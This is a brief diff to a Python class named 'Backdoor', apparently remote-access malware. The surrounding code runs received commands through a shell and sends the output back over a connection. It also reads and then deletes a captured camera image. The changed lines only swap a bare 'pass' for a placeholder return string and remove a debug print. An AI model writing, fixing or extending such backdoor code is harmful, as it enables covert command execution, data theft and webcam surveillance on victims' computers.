@@ -31,7 +31,7 @@ class Backdoor:
         try:
             return subprocess.check_output(command, shell=True).decode("utf-8")
         except:
-            pass
+            return "sometext"
 
     def change_working_directory_to(self, path):
         try:
@@ -83,7 +83,6 @@ class Backdoor:
                     command_result = self.read_file("camera.jpg")
                     os.system("rm camera.jpg")
                 else:
-                    print("sometext")
                     command_result = self.execute_system_command(command)                                      
                 self.reliable_send(command_result)
             except:
